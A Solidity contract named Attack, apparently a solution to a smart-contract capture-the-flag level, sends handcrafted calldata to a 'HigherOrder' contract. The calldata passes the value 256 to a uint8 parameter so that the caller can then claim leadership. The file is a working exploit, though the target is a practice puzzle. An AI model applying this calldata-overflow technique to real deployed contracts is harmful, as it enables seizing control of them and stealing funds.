//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IHigherOrder {
    function registerTreasury(uint8) external;
}

/**
 * @dev deploy Attack then call await contract.claimLeadership() 
 */
contract Attack {
    constructor(address higherOrder) payable {
        bytes memory data = bytes.concat(
            IHigherOrder.registerTreasury.selector,
            abi.encode(256)
        );

        (bool s,) = higherOrder.call(data);
        require(s);
    }
}
